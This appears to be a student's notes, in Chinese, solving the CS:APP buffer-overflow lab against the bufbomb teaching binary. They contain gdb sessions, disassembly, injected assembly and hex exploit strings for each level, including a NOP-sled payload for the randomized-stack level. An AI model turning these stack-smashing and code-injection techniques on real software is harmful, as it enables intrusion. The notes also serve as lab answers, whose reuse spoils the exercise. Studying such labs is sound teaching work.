@@ -1,0 +1,315 @@
+buffer lab
+
+smoke
+disas getbuf 查看栈空间的大小0x28，加上main函数和smoke中的0x4个空间，得到48字节
+disas 
+disas smoke,直接找到栈空间的大小，然后填充字符串，覆盖返回地址
+最后加上smoke的首地址
+//
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 18 8c 04 08
+//
+fizz
+ 8048c42:	55                   	push   %ebp
+ 8048c43:	89 e5                	mov    %esp,%ebp
+ 8048c45:	83 ec 18             	sub    $0x18,%esp
+ 8048c48:	8b 45 08             	mov    0x8(%ebp),%eax
+ 8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
+ 8048c51:	75 26                	jne    8048c79 <fizz+0x37>
+ 8048c53:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 8048c57:	c7 44 24 04 ee a4 04 	movl   $0x804a4ee,0x4(%esp)
+和smoke差不多，不同的是要跳入fizz函数，在0x8（%rsp）中存放cookie的值
+8048c48:	8b 45 08             	mov    0x8(%ebp),%eax
+ 8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
+(gdb) x/s 0x804d108
+0x804d108 <cookie>:	"”
+ r -u name会自动生成一个cookie，每个id对应的cookie不一样
+ebp中存放了原来的ebp，esp+4传返回地址，esp+8传cookie
+//
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+42 8c 04 08   //fizz的首地址
+00 00 00 00
+2c 8a 81 29   //cookie的值
+//
+bang
+(gdb) x/s 0x804d100
+0x804d100 <global_value>:	""
+(gdb) x/s 0x804d108
+0x804d108 <cookie>:	""
+(gdb) x/s 0x804a50c
+0x804a50c:	"Misfire: global_value = 0x%x\n"
+读汇编，这一题的意思大概是global_value和cookie的值相等，不仅要返回执行bang函数，还要对global_value的值进行修改
+这里要注入代码才能攻克，先找到global_value的地址
+gdb) x/s 0x804d100
+0x804d100 <global_value>:	""
+(gdb) x/s 0x804d108
+0x804d108 <cookie>:	""
+(gdb) x/s 0x804a50c
+找到字符串储存的地址，在eax中
+反编译getbuf
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x080491f4 <+0>:	push   %ebp
+   0x080491f5 <+1>:	mov    %esp,%ebp
+   0x080491f7 <+3>:	sub    $0x38,%esp
+   0x080491fa <+6>:	lea    -0x28(%ebp),%eax  
+   0x080491fd <+9>:	mov    %eax,(%esp)   //在这里设置一个断点
+   0x08049200 <+12>:	call   0x8048cfa <Gets>
+   0x08049205 <+17>:	mov    $0x1,%eax
+   0x0804920a <+22>:	leave  
+   0x0804920b <+23>:	ret    
+End of assembler dump.
+(gdb) b *0x080491fd
+Breakpoint 1 at 0x80491fd
+(gdb) r -u abc   //这里我下断点的位置不同会跑不起来，不知道为什么，师傅能解释一下吗
+Starting program: /home/fang/Desktop/lab/buflab-handout/bufbomb -u abc
+Userid: abc
+Cookie: 0x29818a2c
+
+Breakpoint 1, 0x080491fd in getbuf ()
+(gdb) i r
+查看寄存器的值，eax中的值就是字符串的地址
+
+eax            0x55682fa8	
+注入代码
+movl $0x29818a2c,0x0804d100  // 将cookie中的值放进global_value的首地址中
+pushl $0x08048c9d  //将bang函数的首地址压入栈中
+ret
+gcc -m32 -c bang.s
+objdump -d bang.o
+
+将得到的机器码写入文档，尾部加上eax的值即可
+//
+c7 05 00 d1
+04 08 2c 8a 
+81 29 68 9d 
+8c 04 08 c3
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+a8 2f 68 55
+//
+
+
+bomb
+这一题的题意是将cookie作为test的返回值，并恢复寄存器的值，且test()不知道的情况下
+前面将ebp覆盖掉了，那需要找到原来%rbp的值
+08048daa <test>:
+ 8048daa:	55                   	push   %ebp
+ 8048dab:	89 e5                	mov    %esp,%ebp
+ 8048dad:	53                   	push   %ebx
+ 8048dae:	83 ec 24             	sub    $0x24,%esp
+ 8048db1:	e8 da ff ff ff       	call   8048d90 <uniqueval>
+ 8048db6:	89 45 f4             	mov    %eax,-0xc(%ebp)
+ 8048db9:	e8 36 04 00 00       	call   80491f4 <getbuf>
+ 8048dbe:	89 c3                	mov    %eax,%ebx
+ 8048dc0:	e8 cb ff ff ff       	call   8048d90 <uniqueval>
+ 8048dc5:	8b 55 f4             	mov    -0xc(%ebp),%edx
+下断点在调用getbuf的后一条语句
+(gdb) b *0x08048dbe
+Breakpoint 1 at 0x8048dbe
+(gdb) r -u abc
+Starting program: /home/fang/Desktop/lab/buflab-handout/bufbomb -u abc
+Userid: abc
+Cookie: 0x29818a2c
+Type string:hhhhhhh
+
+Breakpoint 1, 0x08048dbe in test ()
+(gdb) i r
+eax            0x1	1
+ecx            0xa	10
+edx            0xa	10
+ebx            0x0	0
+esp            0x55682fd8	0x55682fd8 <_reserved+1036248>
+ebp            0x55683000	0x55683000 <_reserved+1036288>
+esi            0x55686420	1432904736
+edi            0x1	1
+eip            0x8048dbe	0x8048dbe <test+20>
+eflags         0x216	[ PF AF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+提取出ebp的值，这是ebp的原始值，按照题目意愿进行代码填充这里和前一题的思路一样了
+movl $0x29818a2c,%eax  //cookie中的值放在eax中
+movl $0x55683000,%ebp //ebp的原始值
+push $0x8048dbe  //将call getbuf的下一条指令压入栈中
+ret
+翻译成机器码，填充到开头，最后四个字节用eax中的值填充
+//
+b8 2c 8a 81
+29 bd 00 30
+68 55 68 be
+8d 04 08 c3 
+00 00 00 00
+00 00 00 00 
+00 00 00 00 
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+a8 2f 68 55
+//
+
+level4
+终于写完了，直接干了一个晚上加半个白天
+调用5次testn的getn，返回5次cookie给testn，这里的栈地址会随机变化，所以只能通过代码分析整出答案
+0x08048e26 <+0>:	push   %ebp
+   0x08048e27 <+1>:	mov    %esp,%ebp
+   0x08048e29 <+3>:	push   %ebx
+   0x08048e2a <+4>:	sub    $0x24,%esp
+   0x08048e2d <+7>:	call   0x8048d90 <uniqueval>
+   0x08048e32 <+12>:	mov    %eax,-0xc(%ebp)
+   0x08048e35 <+15>:	call   0x804920c <getbufn>
+   0x08048e3a <+20>:	mov    %eax,%ebx
+注意这里0x08048e2a <+4>:	sub    $0x24,%esp
+ebp与esp的差值就是0x28(0x24+0x4=0x28)
+这里就可以直接注入代码了
+mov $0x29818a2c,%eax   //cookie给返回值
+lea 0x28(%esp),%ebp  //恢复栈的大小
+push $0x8048e3a   //返回getbufn的下一条指令
+ret
+
+gcc -m32 -c testn.s
+objdump -d testn.o//整出机器码
+返回地址是动态的，无法直接返回这里就用nop（90）填充就好了，用到了nop sild
+填充的字符
+8049215:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+0x208+0x4=524个字节，然后读入字符串的首地址
+gdb调试
+(gdb) b *0x0804921b  
+Breakpoint 1 at 0x804921b
+(gdb) p/x $ebp-0x208
+No registers.
+(gdb) r -n -u abc
+Starting program: /home/fang/Desktop/lab/buflab-handout/bufbomb -n -u abc
+Userid: abc
+Cookie: 0x29818a2c
+
+Breakpoint 1, 0x0804921b in getbufn ()
+(gdb) p/x $ebp-0x208
+$1 = 0x55682dc8
+(gdb) c
+Continuing.
+Type string:1
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b in getbufn ()
+(gdb) p/x $ebp-0x208
+$2 = 0x55682e38
+(gdb) c
+Continuing.
+Type string:1
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b in getbufn ()
+(gdb) p/x $ebp-0x208
+$3 = 0x55682d88
+(gdb) c
+Continuing.
+Type string:1
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b in getbufn ()
+(gdb) p/x $ebp-0x208
+$4 = 0x55682e38
+(gdb) c
+Continuing.
+Type string:1
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b in getbufn ()
+(gdb) p/x $ebp-0x208
+$5 = 0x55682dd8
+(gdb) c
+Continuing.
+Type string:1
+Dud: getbufn returned 0x1
+Better luck next time
+[Inferior 1 (process 42774) exited normally]
+直接填入最高的地址，这样比较保险,构造完要复制5次就成功了，前四次要用a0换行
+//
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 b8 
+2c 8a 81 29 8d 6c 24 28 68 3a 
+8e 04 08 c3 38 2e 68 55
+0a
+//
